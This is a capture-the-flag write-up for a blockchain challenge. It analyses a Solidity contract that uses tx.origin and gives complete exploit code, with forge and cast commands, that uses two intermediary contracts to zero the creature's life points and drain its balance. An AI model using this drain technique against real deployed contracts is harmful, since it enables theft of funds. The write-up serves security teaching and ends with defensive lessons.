# Distract and Destroy — Blockchain Challenge Writeup

## Overview

This challenge revolves around exploiting flawed logic in a smart contract that simulates a combat scenario. The objective is to reduce the creature’s life points to zero and drain its balance.

The challenge consists of two contracts:

* `Creature.sol` — main vulnerable contract
* `Setup.sol` — deploys the target and defines the win condition

---

## Contracts Analysis

### Setup Contract

```solidity
function isSolved() public view returns (bool) {
    return address(TARGET).balance == 0;
}
```

The challenge is solved when the target contract’s balance becomes zero.

---

### Creature Contract

Key variables:

```solidity
uint256 public lifePoints;
address public aggro;
```

* `lifePoints` starts at `1000`
* `aggro` stores the first attacker

---

### Attack Function

```solidity
function attack(uint256 _damage) external {
    if (aggro == address(0)) {
        aggro = msg.sender;
    }

    if (_isOffBalance() && aggro != msg.sender) {
        lifePoints -= _damage;
    }
}
```

To deal damage, two conditions must be satisfied:

1. `_isOffBalance()` must return `true`
2. `msg.sender` must NOT be the `aggro` address

---

### Off-Balance Check

```solidity
function _isOffBalance() private view returns (bool) {
    return tx.origin != msg.sender;
}
```

This introduces a vulnerability:

* If a contract calls `attack()` → `tx.origin != msg.sender` → `true`
* If an EOA calls directly → `false`

---

### Loot Function

```solidity
function loot() external {
    require(lifePoints == 0, "Creature is still alive!");
    payable(msg.sender).transfer(address(this).balance);
}
```

Funds can only be withdrawn after reducing `lifePoints` to zero.

---

## Vulnerability

The contract incorrectly relies on `tx.origin` for logic.

### Issue:

Using `tx.origin` allows attackers to manipulate call context via intermediate contracts.

### Impact:

* Enables bypass of intended restrictions
* Allows damage only through contract calls

---

## Exploitation Strategy

We need to satisfy both conditions:

| Condition             | Requirement                                    |
| --------------------- | ---------------------------------------------- |
| `_isOffBalance()`     | Call via contract                              |
| `aggro != msg.sender` | Use a different contract than the first caller |

---

### Step-by-step Plan

1. Deploy **Contract A**

   * Call `attack(0)`
   * Sets `aggro = Contract A`

2. Deploy **Contract B**

   * Call `attack(1000)`
   * Conditions satisfied → damage applied

3. Call `loot()`

   * Drain contract balance

---

## Exploit Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ICreature {
    function attack(uint256 _damage) external;
    function loot() external;
}

contract Attacker {
    function attack(address target, uint256 dmg) external {
        ICreature(target).attack(dmg);
    }
}

contract SolveScript {
    function run(address target) external {
        Attacker a = new Attacker();
        Attacker b = new Attacker();

        // Step 1: set aggro
        a.attack(target, 0);

        // Step 2: deal damage
        b.attack(target, 1000);

        // Step 3: loot
        ICreature(target).loot();
    }
}
```

---

## Execution

### 1. Get Connection Info

```bash
curl http://<IP>:<PORT>/connection_info
```

---

### 2. Run Exploit

```bash
forge script script/Solve.s.sol:SolveScript \
--rpc-url http://<IP>:<PORT>/rpc \
--private-key <PRIVATE_KEY> \
--broadcast
```

---

### 3. Verify Solve

```bash
cast call <SETUP_ADDRESS> "isSolved()(bool)" \
--rpc-url http://<IP>:<PORT>/rpc
```

Expected output:

```
true
```

---

### 4. Retrieve Flag

```bash
curl http://<IP>:<PORT>/flag
```

---

## Key Takeaways

* `tx.origin` should never be used for authorization or critical logic
* Multi-contract interactions can bypass naive checks
* State-dependent logic (like `aggro`) can introduce unintended exploit paths
* Always analyze call context (`msg.sender` vs `tx.origin`)

---

## Conclusion

By leveraging a `tx.origin` misuse and the aggro mechanic, we were able to:

* Manipulate contract state using two attacker contracts
* Reduce life points to zero
* Drain the contract balance
* Successfully solve the challenge

---
